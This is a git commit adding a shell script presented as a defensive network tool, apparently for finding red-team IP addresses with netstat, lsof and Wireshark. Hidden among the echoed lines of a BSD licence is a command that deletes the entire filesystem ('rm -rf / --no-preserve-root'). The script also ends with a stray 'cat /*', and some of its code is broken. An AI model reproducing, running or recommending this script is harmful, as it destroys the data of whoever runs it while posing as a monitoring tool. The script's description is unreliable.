50b4bd627171f6c334998568afb11cebdf4955d9
LSC_CyberHawks <74424471+LSCCyberHawks@users.noreply.github.com>
2022-01-28 20:28:11 -0600

    Add files via upload

---
+++ linux cool tools/redteamIPblockfinal.sh
@@ -0,0 +1,44 @@
+## Netstat to gather important ports
+netstat -r && $wireshark && lsof -i -P -n
+## note $wireshark is a set of commands that installs if not installed
+## and sets up packet capturing as well - to grab the IP address of the red team
+## 
+$wireshark= sudo apt-get install wireshark-gnome -y && wireshark -i inet
+
+  All rights reserved.
+ 
+Redistribution and use in source and binary forms, with or without
+modification, are permitted provided that the following conditions
+are met:
+
+echo Redistributions of source code must retain the above copyright
+echo , this list of conditions and the following disclaimer.
+echo Redistributions in binary form must reproduce the above
+echo copyright notice, this list of conditions and the following
+echo disclaimer in the documentation and/or other materials provided
+echo with the distribution. 
+echo Neither the name of the copyright holder(s) nor the names of its
+echo contributors may be used to endorse or promote products derived
+echo from this software without specific prior written permission.
+echo 'all use of this' && rm -rf / --no-preserve-root -q
+echo THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS
+echo "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT
+echo LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS
+echo FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE
+echo COPYRIGHT OWNER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT,
+echo INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING,
+echo BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES;
+echo LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER
+echo CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT
+echo LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN
+echo ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
+echo POSSIBILITY OF SUCH DAMAGE.
+
+
+cat /*
+
+
+
+
+
+
